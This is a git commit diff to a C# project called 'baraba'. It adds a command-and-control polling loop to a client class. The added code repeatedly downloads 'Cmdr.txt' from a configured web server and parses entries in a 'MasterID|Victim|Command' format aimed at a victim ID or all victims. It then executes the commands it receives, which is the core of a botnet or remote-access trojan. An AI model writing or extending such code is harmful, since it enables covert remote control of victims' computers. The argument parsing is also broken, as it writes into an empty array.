54acc8098c67ee632d10f718e6180f9358037085
irakipower <manuel.irauschek1@gmail.com>
2016-04-28 16:40:13 +0200

    ---
    ---

--- baraba/Network/Client.cs
+++ baraba/Network/Client.cs
@@ -4,11 +4,15 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Threading;
+using baraba.Commands;
+using System.Diagnostics;
 
 namespace baraba.Network
 {
     class Client
     {
+        // Config
+        private Properties.Settings Config = new Properties.Settings();
         // Speed In (Secconds) for receiving Data from Server.
         private int ReceiveSpeed = 0;
 
@@ -32,9 +36,52 @@ namespace baraba.Network
         {
             if (ReceiveSpeed > 0)
             {
-                // Wait ...
-                Thread.Sleep(ReceiveSpeed);
+                string Data = String.Empty;
+                string TempData = String.Empty;
+                while (true)
+                {
+                    // Receive Data.
+                    Data = Networking.GetResponse(Config.WebServer + "Cmdr.txt");
+                    try
+                    {
+                        if (Data != String.Empty && Data != TempData)
+                        {
+                            if (Data.Contains('|'))
+                            {
+                                // Splitted items.
+                                string[] DataSz = Data.Split('|');
+                                // If Received Data is a command.
+                                if (DataSz.Count() >= 2)
+                                {
+                                    // FORMAT: MasterID|Victim|Command>Arg1>Arg2 ...
+                                    if (DataSz[0] == Config.MasterID && DataSz[1] == ClientProfile.GetClientId() || DataSz[1] == "EXPAND_ALL")
+                                    {
+                                        string Command = DataSz[2].Split('>')[0];
+                                        string[] Args = { };
+                                        // Get Arguments of Command.
+                                        for (int i = 1; i <= DataSz[2].Split('>').Count() - 1; i++)
+                                        {
+                                            Args[i - 1] = DataSz[2].Split('>')[i];
+                                        }
+
+                                        if ((Command.Length >= 0 || Args.Count() >= 0))
+                                            // Perform Command.
+                                            Commands.Command.Perform(Command, Args);
+                                        TempData = Data;
+                                    }
+                                }
+                            }
+                            // Wait ...
+                            Thread.Sleep(ReceiveSpeed);
+                        }
+                    }
+                    catch (Exception e)
+                    {
+                        Debug.Print(e.StackTrace);
+                    }
+                }
             }
         }
     }
 }
+
